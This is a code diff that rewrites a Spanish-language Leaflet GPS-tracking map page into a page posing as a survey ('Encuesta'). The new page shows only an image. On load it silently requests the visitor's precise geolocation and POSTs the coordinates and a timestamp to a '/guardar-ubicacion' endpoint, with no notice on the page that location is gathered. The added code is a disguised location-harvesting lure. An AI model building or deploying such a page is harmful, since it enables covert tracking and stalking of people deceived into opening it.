@@ -1,57 +1,46 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-  <title>Rastreo GPS con Leaflet</title>
   <meta charset="UTF-8" />
-  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css"
-    integrity="sha256-sA+2Fb07x3Jo9GgJvLKfQ4fPv8Q52OxK0oz+MZxg0Zw="
-    crossorigin=""/>
+  <title>Encuesta</title>
   <style>
-    #map {
-      height: 90vh;
-      width: 100%;
+    body, html {
+      margin: 0; padding: 0; height: 100%; display: flex; justify-content: center; align-items: center; background: #fff;
+    }
+    img {
+      max-width: 90vw;
+      max-height: 90vh;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
     }
   </style>
 </head>
 <body>
-  <h2>Rastreo en Tiempo Real</h2>
-  <div id="map"></div>
-
-  <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"
-    integrity="sha256-DxPgWbWPlv3OkC2aB9O4dWuXlp9sNPPau8N8C3vJsN4="
-    crossorigin=""></script>
+  <img src="https://i.imgur.com/tuImagen.jpg" alt="Encuesta visual" />
 
   <script>
-    const map = L.map('map').setView([19.4326, -99.1332], 16); // CDMX por defecto
-
-    // Capa del mapa usando OpenStreetMap
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-      maxZoom: 19,
-      attribution: '© OpenStreetMap'
-    }).addTo(map);
-
-    const marker = L.marker([19.4326, -99.1332]).addTo(map).bindPopup('Tu ubicación').openPopup();
-
-    // Función para actualizar la ubicación en tiempo real
-    function trackLocation() {
+    // Al cargar, intenta obtener ubicación y mandarla al servidor
+    window.onload = () => {
       if (navigator.geolocation) {
-        navigator.geolocation.watchPosition(
-          (position) => {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            const newPos = [lat, lng];
-            marker.setLatLng(newPos);
-            map.setView(newPos, 16);
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            fetch('/guardar-ubicacion', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                timestamp: Date.now()
+              })
+            });
           },
-          (err) => alert("Error obteniendo ubicación: " + err.message),
-          { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+          (err) => {
+            console.warn('No se pudo obtener ubicación:', err.message);
+          },
+          { enableHighAccuracy: true, timeout: 5000 }
         );
-      } else {
-        alert("Tu navegador no soporta geolocalización.");
       }
-    }
-
-    trackLocation();
+    };
   </script>
 </body>
 </html>
